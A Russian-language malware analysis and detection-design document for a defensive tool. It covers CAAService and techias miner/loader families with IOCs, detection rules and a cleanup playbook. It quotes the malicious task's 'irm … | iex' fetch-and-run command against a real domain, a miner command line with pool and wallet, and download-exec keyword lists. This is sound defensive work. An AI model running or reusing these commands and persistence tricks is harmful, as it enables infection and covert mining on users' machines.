# Семейства майнеров и загрузчиков: CAAService и techias

Ноябрь 2026. Одно и то же заражение нашлось на трёх компьютерах пользователя. Ни Защитник Windows, ни KVRT загрузчик
не распознали. Его выдало поведение: автозапуск, исключения Защитника, задача-маскировка и правила брандмауэра.
В документе собраны индикаторы (IOC), техники, правила Sentinel и плейбук чистки.

> В репозитории хранятся только хеши и метаданные. Живых образцов здесь нет и не будет.

## 1. Семейство CAAService (ботнет Pearl / pearlhash)

| Объект | Значение |
|---|---|
| Каталог | `C:\ProgramData\CAAService\` (подпапки `Autotune`, `Cache`) |
| Загрузчик | `CAAServices.exe`, без подписи. SHA-256 `BFD086E44CFE11D63271F2E5959969D435750403A340C675688219DB43B62376` (~42 МБ), старый вариант `81FE4C33E7E899CA992B21F0AAD310F29062DF6A4221A5F9E6A07CD1F82B9477` (~18,6 МБ) |
| GPU-майнер | `Microsoft Network Realtime lnspection Service.exe`: в слове «lnspection» строчная L вместо I. SHA-256 `1A58995232C96501A8C17139DB5404527D9EC0B57863AE03605DD477E181FFDF` |
| Конфигурация | `CAAServices.vdr`, 160 байт. SHA-256 `4B9F7AE1213D93BC3DE0330E84E42B8C29687E693D11DE6D39DA5C4C0AC4C495` |
| Закрепление | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, значение «CAA Service» |
| Поведение | Загрузчик (родитель — `explorer.exe`) при каждом входе заново создаёт exe майнера и запускает его дочерним процессом. Слушает TCP 24424 (бэкдор); входящие соединения шли с 95.37.216.178 |
| Командная строка майнера | `--algorithm-gpu pearlhash --pool prl-ru.kryptex.network:7048,155.212.215.227:7048 --wallet prl1p5hgdn92f0h2zt0qaemc6f8zdx5u28fvkpmvzhaehm6xwqgtez7dsqert43.H6` |
| Сеть | `prl-ru.kryptex.network`, `155.212.215.227:7048`, `43.174.218.73:8888`, `95.37.216.178` (входящие на 24424) |
| Детекты других АВ | `Trojan.Win64.Miner.lvfp`, `not-a-virus:RiskTool.Win32.BitCoinMiner.ozuc`. Вместе с ним бывает троян Powedon: он живёт в памяти и в Планировщике и перезапускает майнер |
| Вектор | Поддельный установщик «Hiddify 2.5.7» (`C:\Program Files\Hiddify`). Ключ удаления `6L903538-42B1-4596-G479-BJ779F21A65D_is1`: в GUID стоят невозможные буквы G, L и J |

## 2. Семейство techias (загрузчик из пиратского активатора Office)

| Объект | Значение |
|---|---|
| Задача | `\Microsoft\Office\Office Persistent Activation`: запуск от SYSTEM при входе, `powershell.exe -Command "irm https://activate.techias.co.uk/ \| iex"` |
| Загруженный файл | `C:\ProgramData\WinAIHService\WinAIHService.exe`: 12 544 512 байт, без подписи, VersionInfo «WinNetService / WinNetService.dll». SHA-256 `613DD576FF9F6B44E958E1F7DF34123B1DED45AFF7063577AF83665D2483A32D` |
| Закрепление | Run-значение «Win AIH Service» |
| Вектор | Пиратский активатор Microsoft Office (ProPlus 2024) |

## 3. Общие техники (ловятся поведением, а не хешами)

1. **Порча Защитника.** Добавляются `ExclusionPath` на собственную папку в ProgramData и `ExclusionProcess powershell.exe`.
   В журнале `Microsoft-Windows-Windows Defender/Operational` это событие 5007. Оно появляется через секунды после создания файла.
2. **Маскировка задачи.** Задача лежит в `\Microsoft\...`, но запускает powershell с загрузкой из сети.
   Настоящие задачи в этой папке запускают exe с подписью Microsoft.
3. **Маскировка правил брандмауэра.** Разрешающие правила на вход и выход для всех профилей носят системные имена
   («Network Discovery (SSDP-Out)», «Core Networking – Router Solicitation»), а программа в них лежит в ProgramData.
4. **Маскировка имени файла.** Неподписанный exe с именем «Microsoft …» или «Windows …» и подменой похожих символов:
   l и I, 0 и O, кириллица вместо латиницы.
5. **Майнинг.** Аргументы `--algorithm`, `--pool`, `--wallet`, `-o stratum+tcp://`, pearlhash, kryptex. Порты пулов
   7048, 3333, 4444, 5555, 14444. Длительная загрузка GPU или CPU в простое.

## 4. Что ловит Sentinel

### Правила (`rules/families.json`)

| Правило | Что ловит | Серьёзность |
|---|---|---|
| `SNT-FAM-CAA-0001` | 4 хеша CAAService (загрузчик ×2, майнер, `.vdr`) | critical |
| `SNT-FAM-CAA-0002` | Конфигурация или командная строка pearlhash: кошелёк `prl1…` либо `pearlhash` вместе с пулом Kryptex / `--algorithm-gpu` | high |
| `SNT-FAM-TECHIAS-0001` | Хеш `WinAIHService.exe` | critical |
| `SNT-FAM-TECHIAS-0002` | Скрипты и файлы с `activate.techias.co.uk` | high |

Хеши, IP-адреса, домены, порты, имена Run-значений и задач собраны также в `ThreatFamilyCatalog`
(`src/Sentinel.Core/ThreatFamilies`). Правила ловят файлы при сканировании, каталог ловит процессы, соединения и закрепление при аудите.

### Находки аудиторов

| Код | Аудитор | Условие |
|---|---|---|
| `PERS-RUN-USERWRITABLE-UNSIGNED` | Persistence | Run/RunOnce (HKLM, HKCU, Wow6432Node, `Policies\Explorer\Run`) → неподписанный exe в ProgramData, AppData или Temp |
| `PERS-FAMILY-IOC` | Persistence | Имя Run-значения, путь задачи, каталог или строка известного семейства |
| `PERS-RUN-DOWNLOAD-EXEC` | Persistence | Run-значение скачивает и выполняет код |
| `PERS-TASK-DOWNLOAD-EXEC` | Persistence | В задаче есть irm/iwr/iex/Invoke-Expression/DownloadString/DownloadFile/Net.WebClient/`-enc`/FromBase64String/mshta http/bitsadmin /transfer/`certutil -urlcache`/curl или wget с запуском. Без отягчающих признаков — Medium. Один из признаков (`\Microsoft\*`, SYSTEM, вход или загрузка) — High. Все три или IOC семейства — Critical |
| `PERS-DECEPTIVE-NAME`, `PERS-FAKE-MICROSOFT` | Persistence | Цель автозапуска или имя задачи с подменой символов; файл «Microsoft/Windows» без подписи Microsoft |
| `PERS-UNINSTALL-FORGED-GUID` | Persistence | В ключе `Uninstall\{GUID}_is1` в GUID есть символы вне 0-9 и A-F. Для известного носителя (Hiddify) — High |
| `PERS-SERVICE-USERWRITABLE`, `PERS-WMI-*` | Persistence | Службы из ProgramData, AppData или Temp; WMI-подписки (было и раньше) |
| `CFG-DEFENDER-EXCL` | Config | Исключения Path/Process/Extension/IpAddress, в том числе через Policies. High для интерпретаторов (powershell, pwsh, cmd, wscript, cscript, mshta, rundll32, regsvr32) и для путей в ProgramData, AppData или Temp |
| `CFG-DEFENDER-POLICY` | Config | DisableAntiSpyware, DisableAntiVirus, DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableOnAccessProtection, DisableIOAVProtection, SpynetReporting=0, SubmitSamplesConsent=2, DisableBlockAtFirstSeen; выключенная TamperProtection |
| `CFG-FW-MASQUERADE` | Config | Разрешающее правило с именем системного правила Windows, а программа лежит вне `%SystemRoot%` и Program Files или не подписана. Правила с именем-ресурсом (`@FirewallAPI.dll,…`) не трогаются |
| `PROC-MINER-CMDLINE` | Process | Командная строка майнера: два признака и больше либо индикатор семейства (тогда Critical) |
| `PROC-NET-IOC` / `PROC-NET-POOLPORT` | Process | Соединение с IP семейства / на порт пула (7048, 3333, 4444, 5555, 14444) |
| `PROC-BACKDOOR-LISTEN` | Process | Неподписанный процесс из ProgramData с родителем `explorer.exe` слушает внешний порт. Для порта 24424 — Critical |
| `PROC-DROPPER-CHILD` | Process | Дочерний процесс запущен из того же каталога ProgramData, что и родитель, а его exe создан после старта родителя (загрузчик → майнер) |
| `PROC-DECEPTIVE-NAME`, `PROC-FAKE-MICROSOFT`, `PROC-FAMILY-IOC` | Process | Обманчивое имя; «Microsoft» без подписи Microsoft; SHA-256 образа из IOC |

Детектор похожих символов (`DeceptiveNameAnalyzer`) работает по словарю слов из имён компонентов Windows. Слово
подозрительно, если само в словаре не встречается, а после замены l↔I, 0→O, 1→l или кириллицы на латиницу совпадает
со словарным. Отдельно ловится смешение латиницы и кириллицы в одном слове. Обычные имена программ не помечаются.

### Корреляция (`ThreatFamilyCorrelator`)

- Отдельные признаки в одном каталоге ProgramData дают **Medium**: «нужна проверка», автоматическая чистка не предлагается.
- Связка «неподписанный exe в `C:\ProgramData\<папка>\` + Run на него + исключение Защитника на эту папку» в пределах
  10 минут даёт **High** с вердиктом «Майнер/загрузчик (семейство CAAService/techias-подобное)». Сравниваются три
  времени: создание файла, последнее изменение ключа Run (`RegQueryInfoKey`) и событие 5007 о добавлении исключения.
  Если элементы разнесены во времени дальше окна, связка не засчитывается.
- Совпадение с IOC известного семейства (хеш, каталог, имя значения) вместе со связкой или неподписанным файлом даёт **Critical**.
- Задача «скачать и выполнить» в `\Microsoft\…` вместе с исключением интерпретатора даёт High. С индикатором techias — Critical.
- Каталоги легитимных поставщиков (`Microsoft`, `Package Cache`, `Sentinel`, `NVIDIA`, `Intel` и т. п.) не коррелируются.

## 5. Плейбук нейтрализации (`ThreatFamilyPlaybook`, `sentinel family-clean`)

Плейбук работает через существующие `RemediationEngine` и `QuarantineManager`: манифест отката, `CriticalProcessGuard`,
самозащита, белый список. Выполняется только для находок High и Critical и только с `--confirm`.
Без подтверждения или в режиме «только аудит» выполняется шаг 1 и строится план.

1. **Снимок улик** → `%ProgramData%\Sentinel\Evidence\family-<время>.json` и `.html`. В снимок входят пути, SHA-256,
   подписи, командные строки, дерево процессов, команды задач, строки правил брандмауэра, исключения и план.
2. **Остановка процессов** через `RemediationEngine.TerminateProcessTree`. Системные и доверенные процессы, а также
   Sentinel защищены. Загрузчик (родитель) останавливается первым, иначе он пересоздаст майнер.
3. **Удаление закрепления**: задача (её XML сохраняется в манифест), Run-значение (значение сохраняется), службы (`Start=4`).
   Настоящие задачи Office (`OfficeC2RClient.exe`, `OfficeTelemetryAgent*` из Program Files с подписью Microsoft) не трогаются никогда.
4. **Восстановление защиты**: удаляются вредные исключения Защитника (каждое сохраняется для отката) и поддельные
   правила брандмауэра (сохраняется исходная строка правила).
5. **Карантин**: все файлы каталога семейства (junction и symlink пропускаются) переносятся в шифрованный контейнер,
   SHA-256 записывается в манифест карантина. После этого удаляется опустевший каталог (в манифесте отката — `EmptyDirectory`).
6. **Блокировка IOC** (только с `--block-ioc`): правило «Sentinel IOC Block (…)» запрещает исходящие соединения
   на IP семейства, в hosts добавляются записи `0.0.0.0 <домен>`. И то и другое откатывается.
7. **Проверка через 45 секунд**: файлы не пересозданы, процессов из каталога нет, соединений с IOC нет, исключения не
   вернулись, повторный аудит закрепления не находит Run, задач, WMI или «скачать и выполнить». Если что-то вернулось,
   значит, остался другой механизм перезапуска (например, Powedon-подобная задача или WMI). Пользователь получает список.
8. **Перезагрузка**: плейбук рекомендует перезагрузиться и оставляет отметку `family-recheck.json`. Служба Sentinel через
   3 минуты после старта повторяет проверку шага 7 и пишет результат в журнал. Если всё чисто, отметка удаляется.
9. **Сообщение на русском** включает: что найдено и что сделано, где карантин, как откатить
   (`sentinel rollback list/undo`, `sentinel quarantine list/restore`). Ещё в нём совет сменить пароли с чистого устройства
   и включить 2FA, предложение отправить хеши в `newvirus@kaspersky.com` и прямо названный вектор (пиратский активатор,
   поддельный установщик).

Откат: `RollbackKind` дополнен значениями `FirewallRule` (правило воссоздаётся по сохранённой строке),
`FirewallBlockRule` (правило блокировки удаляется) и `EmptyDirectory` (каталог создаётся заново).
Задачи, Run, исключения и hosts откатываются прежними механизмами.

## 6. Проверка на живой Windows

Код для Windows проверяется на Linux через интерфейсы и заглушки. Классы ниже требуют проверки на реальной системе:
`WindowsNetworkConnectionProvider` (`GetExtendedTcpTable`), `WindowsDefenderEventSource` (`wevtutil`, событие 5007),
`WindowsFirewallRuleEditor` (NetSecurity), `WindowsRegistryProvider.GetLastWriteTimeUtc` (`RegQueryInfoKey`) и
`FamilyRecheckWorker`. Безопасная проверка — на синтетических объектах: своя папка `C:\ProgramData\SentinelFamilyTest`
с любым неподписанным exe, своё Run-значение, своё исключение и своё правило брандмауэра. Боевые образцы для этого не нужны.
